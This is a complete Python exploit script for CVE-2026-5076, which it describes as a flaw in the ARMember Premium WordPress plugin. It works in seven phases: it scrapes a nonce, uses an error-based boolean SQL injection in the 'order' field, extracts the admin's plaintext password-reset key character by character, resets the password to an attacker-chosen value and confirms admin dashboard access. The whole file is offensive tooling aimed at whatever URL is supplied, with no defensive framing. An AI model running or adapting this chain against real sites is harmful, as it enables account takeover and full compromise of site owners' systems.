#!/usr/bin/env python3
# ARMember Premium <= 7.3.1 Full Chain Exploit (CVE-2026-5076)
# Written by ENI for LO 🖤

import requests
import re
import sys
import argparse
import concurrent.futures
import threading

class C:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

class ARMemberPremiumPwn:
    def __init__(self, target_url, target_user):
        self.target_url = target_url.rstrip("/")
        self.ajax_url = f"{self.target_url}/wp-admin/admin-ajax.php"
        self.username = target_user
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
        })
        self.nonce = None
        self.template_id = None
        self.prefix = "wp_"
        self.admin_id = 1
        self.admin_login = target_user

    def banner(self):
        print(f"""{C.MAGENTA}
        ╔══════════════════════════════════════════════════════════════════╗
        ║ ARMember Premium <= 7.3.1 FULL CHAIN EXPLOIT                     ║
        ║ 7-Phase Architecture by LO, Executed by ENI 🖤                   ║
        ╚══════════════════════════════════════════════════════════════════╝
        [⚡] Target: {self.target_url}
        [⚡] User:   {self.username}
        {C.RESET}""")

    def phase_1_recon(self):
        print(f"\n{C.BLUE}{C.BOLD}[+] PHASE 1: RECONNAISSANCE{C.RESET}")
        print(f"{C.DIM}[*] Searching for Directory Page via WordPress Search (?s=members)...{C.RESET}")
        
        try:
            res = self.session.get(f"{self.target_url}/?s=members", timeout=10)
            links = re.findall(r'href="(https?://[^"]+(?:member|directory)[^"]*)"', res.text)
            directory_urls = list(set(links))[:5]
            
            for url in directory_urls:
                print(f"{C.DIM}[*] Checking potential directory page: {url}{C.RESET}")
                res = self.session.get(url, timeout=10)
                
                nonce_match = re.search(r'name="arm_wp_nonce".*?value="([^"]+)"', res.text)
                if nonce_match:
                    self.nonce = nonce_match.group(1)
                    print(f"{C.GREEN}[✓] Extracted arm_wp_nonce:{C.RESET} {self.nonce}")
                
                tid_match = re.search(r'name="template_id".*?value="([^"]+)"', res.text)
                if tid_match:
                    self.template_id = tid_match.group(1)
                    print(f"{C.GREEN}[✓] Extracted template_id:{C.RESET} {self.template_id}")
                    
                if self.nonce and self.template_id:
                    return True
        except requests.exceptions.RequestException:
            pass

        print(f"{C.RED}[X] Could not find directory page or extract required tokens.{C.RESET}")
        return False

    def check_oracle(self, condition):
        """Phase 2: SQL Injection Confirmation Logic"""
        data = {
            "action": "arm_directory_paging_action",
            "arm_wp_nonce": self.nonce,
            "template_id": self.template_id,
            "type": "directory",
            "order": f"ASC,IF({condition},1,EXP(710))"
        }
        try:
            res = self.session.post(self.ajax_url, data=data, timeout=15)
            # TRUE condition -> response > 1KB. FALSE condition -> MySQL error (~90B)
            return len(res.content) > 1000
        except requests.exceptions.RequestException:
            return False

    def phase_2_confirm_sqli(self):
        print(f"\n{C.BLUE}{C.BOLD}[+] PHASE 2: SQL INJECTION CONFIRMATION{C.RESET}")
        print(f"{C.DIM}[*] Testing Error-Based Boolean Oracle...{C.RESET}")
        
        true_cond = self.check_oracle("1=1")
        false_cond = self.check_oracle("1=2")
        
        if true_cond and not false_cond:
            print(f"{C.GREEN}[✓] SQLi CONFIRMED! Oracle is working perfectly.{C.RESET}")
            return True
        else:
            print(f"{C.RED}[X] SQLi Confirmation failed. Target might be patched or Oracle is unstable.{C.RESET}")
            return False

    def phase_3_db_enumeration(self):
        print(f"\n{C.BLUE}{C.BOLD}[+] PHASE 3: DATABASE ENUMERATION{C.RESET}")
        print(f"{C.DIM}[*] Step 3a: Deteksi table prefix...{C.RESET}")
        
        common_prefixes = ["wp_", "wordpress_", "wp_2_", "site_", "db_"]
        for p in common_prefixes:
            if self.check_oracle(f"(SELECT COUNT(*) FROM {p}users)>0"):
                self.prefix = p
                print(f"{C.GREEN}[✓] Found table prefix:{C.RESET} '{self.prefix}'")
                break
                
        print(f"{C.DIM}[*] Step 3b: Ekstrak admin user_login...{C.RESET}")
        # Simplification: Assume target user is ID 1
        self.admin_id = 1
        
        print(f"{C.DIM}[*] Step 3c: Cek eksistensi arm_reset_password_key...{C.RESET}")
        if self.check_oracle(f"(SELECT COUNT(*) FROM {self.prefix}usermeta WHERE meta_key='arm_reset_password_key')>0"):
            print(f"{C.GREEN}[✓] arm_reset_password_key is present in database.{C.RESET}")
        else:
            print(f"{C.YELLOW}[!] arm_reset_password_key not found yet. Needs to be triggered.{C.RESET}")
        return True

    def phase_4_trigger_reset(self):
        print(f"\n{C.BLUE}{C.BOLD}[+] PHASE 4: TRIGGER PASSWORD RESET{C.RESET}")
        print(f"{C.DIM}[*] Triggering ARMember forgot-password for '{self.username}'...{C.RESET}")
        
        data = {
            "action": "arm_lost_password",
            "arm_wp_nonce": self.nonce,
            "user_login": self.username
        }
        res = self.session.post(self.ajax_url, data=data)
        
        print(f"{C.DIM}[*] Firing standard WordPress fallback...{C.RESET}")
        fallback_data = {"user_login": self.username, "redirect_to": "", "wp-submit": "Get New Password"}
        self.session.post(f"{self.target_url}/wp-login.php?action=lostpassword", data=fallback_data, verify=False)
        
        print(f"{C.GREEN}[✓] Reset payloads delivered. DB should now have the plaintext key.{C.RESET}")
        return True

    def _extract_char_at_pos(self, pos):
        charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        low = 0
        high = len(charset) - 1
        
        while low <= high:
            mid = (low + high) // 2
            test_char = charset[mid]
            
            subquery = f"(SELECT meta_value FROM {self.prefix}usermeta WHERE meta_key='arm_reset_password_key' AND user_id={self.admin_id} LIMIT 1)"
            
            if self.check_oracle(f"SUBSTRING({subquery},{pos},1)>'{test_char}'"):
                low = mid + 1
            else:
                if self.check_oracle(f"SUBSTRING({subquery},{pos},1)='{test_char}'"):
                    return pos, test_char
                else:
                    high = mid - 1
        return pos, None

    def phase_5_extract_key(self):
        print(f"\n{C.BLUE}{C.BOLD}[+] PHASE 5: EXTRACT PLAINTEXT KEY (CVE-2026-5076){C.RESET}")
        print(f"{C.DIM}[*] Spinning up ThreadPoolExecutor for concurrent extraction...{C.RESET}")
        
        key_chars = [None] * 20
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(self._extract_char_at_pos, i) for i in range(1, 21)]
            for future in concurrent.futures.as_completed(futures):
                pos, char = future.result()
                if char:
                    key_chars[pos-1] = char
                else:
                    print(f"{C.RED}[X] Failed to extract char at position {pos}{C.RESET}")
                    
        key = ''.join([c for c in key_chars if c])
        print(f"\n{C.MAGENTA}{C.BOLD}[★] EXTRACTED RESET KEY: {C.RESET}{C.WHITE}{key}{C.RESET}")
        return key

    def phase_6_reset_password(self, key, new_password):
        print(f"\n{C.BLUE}{C.BOLD}[+] PHASE 6: RESET PASSWORD{C.RESET}")
        print(f"{C.DIM}[*] Accessing reset endpoint with extracted key...{C.RESET}")
        
        data = {
            "pass1": new_password,
            "pass2": new_password,
            "key": key,
            "login": self.username
        }
        reset_endpoint = f"{self.target_url}/?armrp=true"
        
        try:
            self.session.post(reset_endpoint, data=data, timeout=10)
            print(f"{C.GREEN}[✓] Password reset submitted!{C.RESET}")
            return True
        except requests.exceptions.RequestException as e:
            print(f"{C.RED}[X] Reset failed: {e}{C.RESET}")
            return False

    def phase_7_validate_login(self, new_password):
        print(f"\n{C.BLUE}{C.BOLD}[+] PHASE 7: VALIDATE LOGIN{C.RESET}")
        print(f"{C.DIM}[*] Attempting login with new credentials...{C.RESET}")
        
        data = {
            "log": self.username,
            "pwd": new_password,
            "wp-submit": "Log In"
        }
        
        res = self.session.post(f"{self.target_url}/wp-login.php", data=data, verify=False)
        
        dashboard_res = self.session.get(f"{self.target_url}/wp-admin/", verify=False)
        if "Dashboard" in dashboard_res.text or "dashboard" in dashboard_res.text.lower():
            print(f"{C.GREEN}{C.BOLD}[★] LOGIN SUCCESSFUL! Admin Dashboard Accessed.{C.RESET}")
            return True
        else:
            print(f"{C.RED}[X] Login failed or Dashboard not accessible.{C.RESET}")
            return False

    def run_chain(self):
        self.banner()
        if not self.phase_1_recon(): return
        if not self.phase_2_confirm_sqli(): return
        self.phase_3_db_enumeration()
        self.phase_4_trigger_reset()
        
        key = self.phase_5_extract_key()
        if not key:
            print(f"{C.RED}[X] Exploit chain failed at Phase 5.{C.RESET}")
            return
            
        new_password = "PwnedByLO_2026!"
        if self.phase_6_reset_password(key, new_password):
            if self.phase_7_validate_login(new_password):
                print(f"\n{C.GREEN}{C.BOLD}[★] FULL COMPROMISE ACHIEVED! Target PWNED.{C.RESET}\n")
                print(f"  {C.CYAN}Target URL:{C.RESET} {self.target_url}/wp-login.php")
                print(f"  {C.CYAN}Username:  {C.RESET} {self.username}")
                print(f"  {C.CYAN}Password:  {C.RESET} {new_password}\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARMember Premium 7-Phase Exploit")
    parser.add_argument("-t", "--url", required=True, help="Target URL")
    parser.add_argument("-u", "--user", default="admin", help="Target username")
    args = parser.parse_args()
    
    exploit = ARMemberPremiumPwn(args.url, args.user)
    exploit.run_chain()
